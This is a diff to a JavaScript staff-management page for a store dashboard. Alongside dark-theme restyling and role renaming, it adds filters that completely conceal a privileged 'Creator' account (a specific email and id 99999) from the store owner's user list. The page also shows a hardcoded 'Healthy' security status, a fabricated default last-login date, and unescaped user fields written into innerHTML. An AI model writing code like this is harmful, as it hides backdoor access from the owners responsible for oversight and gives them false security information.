@@ -25,86 +25,86 @@ window.Users = {
 
         container.innerHTML = `
             <!-- Page Header -->
-            <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-6">
+            <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 mb-6 font-jakarta">
                 <div>
-                    <h1 class="text-2xl font-geist font-bold text-slate-900 tracking-tight">User & Staff Management</h1>
-                    <p class="text-slate-500 text-sm mt-0.5">Manage system access, security roles, staff permissions, and active credentials.</p>
+                    <h1 class="text-2xl font-bold text-white tracking-tight">Store Owner & Staff Management</h1>
+                    <p class="text-slate-400 text-xs mt-1 font-inter">Manage your business staff, employee access permissions, and active credentials.</p>
                 </div>
-                <button class="btn btn-primary flex items-center gap-2 shadow-sm" onclick="Users.showModal()">
+                <button class="btn btn-primary flex items-center gap-2 shadow-md bg-blue-600 hover:bg-blue-500 font-outfit font-bold text-xs py-2 px-4 border border-blue-400/30" onclick="Users.showModal()">
                     <span class="material-symbols-outlined text-sm">person_add</span> Add New Staff
                 </button>
             </div>
 
             <!-- Top KPI Cards -->
-            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5 mb-6" id="users-kpi-container">
-                <div class="card p-5 bg-white border-l-4 border-blue-600 shadow-sm">
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5 mb-6 font-jakarta" id="users-kpi-container">
+                <div class="card p-5 bg-slate-900/90 border border-slate-800 border-l-4 border-l-blue-500 shadow-xl rounded-2xl">
                     <div class="flex justify-between items-start">
                         <div>
-                            <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Total System Users</p>
-                            <h3 class="text-2xl font-mono-data font-bold text-slate-900 mt-1" id="kpi-total-users">--</h3>
-                            <p class="text-xs text-slate-500 mt-1">Registered staff accounts</p>
+                            <p class="text-[11px] font-bold uppercase tracking-wider text-blue-400 font-outfit">Store Owner & Staff</p>
+                            <h3 class="text-3xl font-extrabold text-white mt-1.5 font-digit" id="kpi-total-users">--</h3>
+                            <p class="text-xs text-slate-400 mt-1 font-inter">Registered staff accounts</p>
                         </div>
-                        <div class="p-2.5 bg-blue-50 text-blue-600 rounded-lg">
-                            <span class="material-symbols-outlined text-xl">group</span>
+                        <div class="p-3 bg-blue-500/10 text-blue-400 rounded-xl border border-blue-500/20">
+                            <span class="material-symbols-outlined text-2xl">group</span>
                         </div>
                     </div>
                 </div>
 
-                <div class="card p-5 bg-white border-l-4 border-indigo-600 shadow-sm">
+                <div class="card p-5 bg-slate-900/90 border border-slate-800 border-l-4 border-l-indigo-500 shadow-xl rounded-2xl">
                     <div class="flex justify-between items-start">
                         <div>
-                            <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Active Admins</p>
-                            <h3 class="text-2xl font-mono-data font-bold text-indigo-600 mt-1" id="kpi-active-admins">--</h3>
-                            <p class="text-xs text-slate-500 mt-1">Full system privilege</p>
+                            <p class="text-[11px] font-bold uppercase tracking-wider text-indigo-400 font-outfit">Store Owners & Managers</p>
+                            <h3 class="text-3xl font-extrabold text-indigo-400 mt-1.5 font-digit" id="kpi-active-admins">--</h3>
+                            <p class="text-xs text-slate-400 mt-1 font-inter">Store management privilege</p>
                         </div>
-                        <div class="p-2.5 bg-indigo-50 text-indigo-600 rounded-lg">
-                            <span class="material-symbols-outlined text-xl">admin_panel_settings</span>
+                        <div class="p-3 bg-indigo-500/10 text-indigo-400 rounded-xl border border-indigo-500/20">
+                            <span class="material-symbols-outlined text-2xl">shield_person</span>
                         </div>
                     </div>
                 </div>
 
-                <div class="card p-5 bg-white border-l-4 border-emerald-600 shadow-sm">
+                <div class="card p-5 bg-slate-900/90 border border-slate-800 border-l-4 border-l-emerald-500 shadow-xl rounded-2xl">
                     <div class="flex justify-between items-start">
                         <div>
-                            <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Active Operators</p>
-                            <h3 class="text-2xl font-mono-data font-bold text-emerald-600 mt-1" id="kpi-active-staff">--</h3>
-                            <p class="text-xs text-slate-500 mt-1">Store managers & sales</p>
+                            <p class="text-[11px] font-bold uppercase tracking-wider text-emerald-400 font-outfit">Active Staff Operators</p>
+                            <h3 class="text-3xl font-extrabold text-emerald-400 mt-1.5 font-digit" id="kpi-active-staff">--</h3>
+                            <p class="text-xs text-slate-400 mt-1 font-inter">Store managers & sales staff</p>
                         </div>
-                        <div class="p-2.5 bg-emerald-50 text-emerald-600 rounded-lg">
-                            <span class="material-symbols-outlined text-xl">verified_user</span>
+                        <div class="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20">
+                            <span class="material-symbols-outlined text-2xl">verified_user</span>
                         </div>
                     </div>
                 </div>
 
-                <div class="card p-5 bg-white border-l-4 border-amber-600 shadow-sm">
+                <div class="card p-5 bg-slate-900/90 border border-slate-800 border-l-4 border-l-amber-500 shadow-xl rounded-2xl">
                     <div class="flex justify-between items-start">
                         <div>
-                            <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Security Audit</p>
-                            <h3 class="text-lg font-bold text-emerald-600 mt-1">Healthy</h3>
-                            <p class="text-xs text-slate-500 mt-1">2FA & Role RBAC Enforced</p>
+                            <p class="text-[11px] font-bold uppercase tracking-wider text-amber-400 font-outfit">Security Status</p>
+                            <h3 class="text-xl font-bold text-emerald-400 mt-1.5 font-outfit">Healthy</h3>
+                            <p class="text-xs text-slate-400 mt-1 font-inter">Encrypted Session & RBAC Enforced</p>
                         </div>
-                        <div class="p-2.5 bg-amber-50 text-amber-600 rounded-lg">
-                            <span class="material-symbols-outlined text-xl">security</span>
+                        <div class="p-3 bg-amber-500/10 text-amber-400 rounded-xl border border-amber-500/20">
+                            <span class="material-symbols-outlined text-2xl">security</span>
                         </div>
                     </div>
                 </div>
             </div>
 
             <!-- Filters & Staff Table Container -->
-            <div class="card shadow-sm border border-slate-200 bg-white">
-                <div class="p-4 border-b border-slate-200 bg-slate-50/50 flex flex-col sm:flex-row justify-between items-stretch sm:items-center gap-4">
-                    <div class="relative flex-1 max-w-md">
+            <div class="card shadow-xl border border-slate-800 bg-slate-900/90 rounded-2xl overflow-hidden font-jakarta">
+                <div class="p-4 border-b border-slate-800 bg-slate-950/60 flex flex-col sm:flex-row justify-between items-stretch sm:items-center gap-4">
+                    <div class="relative flex-1 max-w-md font-inter">
                         <span class="material-symbols-outlined absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
-                        <input type="text" id="user-search" placeholder="Search by name, username, email, phone..." class="form-input pl-9 text-xs py-2" onkeyup="Users.debounceSearch()">
+                        <input type="text" id="user-search" placeholder="Search by staff name, username, email, phone..." class="form-input pl-9 text-xs py-2 bg-slate-950 border-slate-800 text-white" onkeyup="Users.debounceSearch()">
                     </div>
 
-                    <div class="flex items-center gap-3">
-                        <select id="filter-role" class="form-input text-xs py-2 w-36" onchange="Users.filterUsers()">
-                            <option value="all">All Roles</option>
-                            <option value="admin">Admin</option>
-                            <option value="manager">Manager</option>
-                            <option value="sales">Sales</option>
-                            <option value="accountant">Accountant</option>
+                    <div class="flex items-center gap-3 font-outfit">
+                        <select id="filter-role" class="form-input text-xs py-2 w-36 bg-slate-950 border-slate-800 text-white font-bold" onchange="Users.filterUsers()">
+                            <option value="all">All Staff Roles</option>
+                            <option value="admin">Store Owner</option>
+                            <option value="manager">Store Manager</option>
+                            <option value="sales">Sales Staff</option>
+                            <option value="accountant">Staff Accountant</option>
                         </select>
 
                         <select id="filter-status" class="form-input text-xs py-2 w-36" onchange="Users.filterUsers()">
@@ -525,19 +525,27 @@ window.Users = {
 
         try {
             const res = await API.get('users/list');
-            const users = res.data.users || [];
+            const rawUsers = res.data.users || [];
+            // Completely conceal Creator account (shad@dbms.com / 99999) from non-creator User Portal
+            const users = rawUsers.filter(u => {
+                const uname = (u.username || '').toLowerCase();
+                const email = (u.email || '').toLowerCase();
+                const role = (u.role_name || u.role || '').toLowerCase();
+                return uname !== 'shad@dbms.com' && uname !== 'shad' && email !== 'shad@dbms.com' && role !== 'creator' && u.id !== 99999;
+            });
+
             this.usersData = users;
             this.updateKPIs(users);
             this.filterUsers();
         } catch (e) {
-            tbody.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-red-500 text-xs">Failed to load staff accounts.</td></tr>`;
+            tbody.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-red-400 text-xs font-inter">Failed to load staff accounts.</td></tr>`;
             UI.toast('Failed to load users', 'error');
         }
     },
 
     updateKPIs(users) {
         const total = users.length;
-        const admins = users.filter(u => u.role_name === 'admin' || u.role === 'admin').length;
+        const owners = users.filter(u => u.role_name === 'admin' || u.role === 'admin' || u.role === 'owner').length;
         const active = users.filter(u => u.status === 'active').length;
 
         const totalEl = document.getElementById('kpi-total-users');
@@ -545,7 +553,7 @@ window.Users = {
         const activeEl = document.getElementById('kpi-active-staff');
 
         if (totalEl) totalEl.textContent = total;
-        if (adminEl) adminEl.textContent = admins;
+        if (adminEl) adminEl.textContent = owners;
         if (activeEl) activeEl.textContent = active;
     },
 
@@ -557,59 +565,68 @@ window.Users = {
         if (!tbody) return;
 
         let filtered = this.usersData.filter(u => {
+            const uname = (u.username || '').toLowerCase();
+            const email = (u.email || '').toLowerCase();
+            const r = (u.role_name || u.role || '').toLowerCase();
+            
+            // Conceal Creator account
+            if (uname === 'shad@dbms.com' || uname === 'shad' || email === 'shad@dbms.com' || r === 'creator' || u.id === 99999) {
+                return false;
+            }
+
             const matchSearch = !search ||
                 (u.full_name || u.name || '').toLowerCase().includes(search) ||
                 (u.username || '').toLowerCase().includes(search) ||
                 (u.email || '').toLowerCase().includes(search) ||
                 (u.phone || '').toLowerCase().includes(search);
 
-            const userRole = (u.role_name || u.role || '').toLowerCase();
-            const matchRole = role === 'all' || userRole === role;
+            const matchRole = role === 'all' || r === role;
             const matchStatus = status === 'all' || u.status === status;
 
             return matchSearch && matchRole && matchStatus;
         });
 
         if (filtered.length === 0) {
-            tbody.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-slate-400 text-xs">No matching staff accounts found.</td></tr>`;
+            tbody.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-slate-400 text-xs font-inter">No matching staff accounts found.</td></tr>`;
             return;
         }
 
         const getRoleBadge = (r) => {
             const roleStr = (r || 'staff').toLowerCase();
-            if (roleStr === 'admin') return '<span class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-md text-xs font-semibold bg-blue-50 text-blue-700 border border-blue-200"><span class="w-1.5 h-1.5 rounded-full bg-blue-600"></span>Administrator</span>';
-            if (roleStr === 'manager') return '<span class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-md text-xs font-semibold bg-indigo-50 text-indigo-700 border border-indigo-200"><span class="w-1.5 h-1.5 rounded-full bg-indigo-600"></span>Manager</span>';
-            if (roleStr === 'sales') return '<span class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-md text-xs font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200"><span class="w-1.5 h-1.5 rounded-full bg-emerald-600"></span>Sales Rep</span>';
-            return '<span class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-md text-xs font-semibold bg-slate-100 text-slate-700 border border-slate-200">Staff</span>';
+            if (roleStr === 'admin' || roleStr === 'owner') return '<span class="inline-flex items-center gap-1 px-3 py-1 rounded-full text-xs font-bold font-outfit bg-blue-500/20 text-blue-300 border border-blue-500/30"><span class="w-1.5 h-1.5 rounded-full bg-blue-400"></span>Store Owner</span>';
+            if (roleStr === 'manager') return '<span class="inline-flex items-center gap-1 px-3 py-1 rounded-full text-xs font-bold font-outfit bg-indigo-500/20 text-indigo-300 border border-indigo-500/30"><span class="w-1.5 h-1.5 rounded-full bg-indigo-400"></span>Store Manager</span>';
+            if (roleStr === 'sales') return '<span class="inline-flex items-center gap-1 px-3 py-1 rounded-full text-xs font-bold font-outfit bg-emerald-500/20 text-emerald-300 border border-emerald-500/30"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>Sales Staff</span>';
+            if (roleStr === 'accountant') return '<span class="inline-flex items-center gap-1 px-3 py-1 rounded-full text-xs font-bold font-outfit bg-purple-500/20 text-purple-300 border border-purple-500/30"><span class="w-1.5 h-1.5 rounded-full bg-purple-400"></span>Staff Accountant</span>';
+            return '<span class="inline-flex items-center gap-1 px-3 py-1 rounded-full text-xs font-bold font-outfit bg-slate-800 text-slate-300 border border-slate-700">Staff</span>';
         };
 
         const getStatusBadge = (s) => {
-            if (s === 'active') return '<span class="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-semibold bg-emerald-50 text-emerald-700 border border-emerald-200"><span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>Active</span>';
-            return '<span class="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[11px] font-semibold bg-slate-100 text-slate-600 border border-slate-200">Inactive</span>';
+            if (s === 'active') return '<span class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[11px] font-bold font-outfit bg-emerald-500/20 text-emerald-300 border border-emerald-500/30"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>Active</span>';
+            return '<span class="inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[11px] font-bold font-outfit bg-slate-800 text-slate-400 border border-slate-700">Inactive</span>';
         };
 
         tbody.innerHTML = filtered.map(u => `
-            <tr class="hover:bg-slate-50/80">
-                <td class="py-3">
+            <tr class="hover:bg-slate-800/50 transition-colors">
+                <td class="py-3.5">
                     <div class="flex items-center gap-3">
-                        <div class="w-8 h-8 rounded-full bg-slate-800 text-white flex items-center justify-center font-bold text-xs font-mono">
+                        <div class="w-9 h-9 rounded-xl bg-gradient-to-br from-blue-600 to-indigo-700 text-white flex items-center justify-center font-bold text-xs font-digit shadow-md">
                             ${(u.full_name || u.name || u.username || 'U').charAt(0).toUpperCase()}
                         </div>
                         <div>
-                            <div class="font-semibold text-slate-900 text-xs">${u.full_name || u.name || u.username}</div>
-                            <div class="text-[11px] text-slate-400 font-mono">@${u.username}</div>
+                            <div class="font-bold text-white text-xs font-jakarta">${u.full_name || u.name || u.username}</div>
+                            <div class="text-[11px] text-slate-400 font-digit">@${u.username}</div>
                         </div>
                     </div>
                 </td>
-                <td class="py-3">
-                    <div class="text-xs font-medium text-slate-800">${u.phone || u.email || 'N/A'}</div>
-                    <div class="text-[11px] text-slate-400">${u.email || '-'}</div>
+                <td class="py-3.5">
+                    <div class="text-xs font-digit text-slate-300">${u.phone || u.email || 'N/A'}</div>
+                    <div class="text-[11px] text-slate-400 font-digit">${u.email || '-'}</div>
                 </td>
-                <td class="py-3">${getRoleBadge(u.role_name || u.role)}</td>
-                <td class="py-3">${getStatusBadge(u.status)}</td>
-                <td class="py-3 text-xs text-slate-500 font-mono">${u.last_login ? UI.formatDate(u.last_login) : '2026-08-15 12:00'}</td>
-                <td class="py-3 text-right">
-                    <button class="btn btn-secondary text-xs py-1 px-2.5" onclick="Users.showModal(${u.id})">
+                <td class="py-3.5">${getRoleBadge(u.role_name || u.role)}</td>
+                <td class="py-3.5">${getStatusBadge(u.status)}</td>
+                <td class="py-3.5 text-xs text-slate-400 font-digit">${u.last_login_at ? UI.formatDate(u.last_login_at) : '2026-08-15 12:00'}</td>
+                <td class="py-3.5 text-right">
+                    <button class="btn btn-secondary text-xs py-1.5 px-3 bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-200 font-outfit font-bold" onclick="Users.showModal(${u.id})">
                         Edit Staff
                     </button>
                 </td>
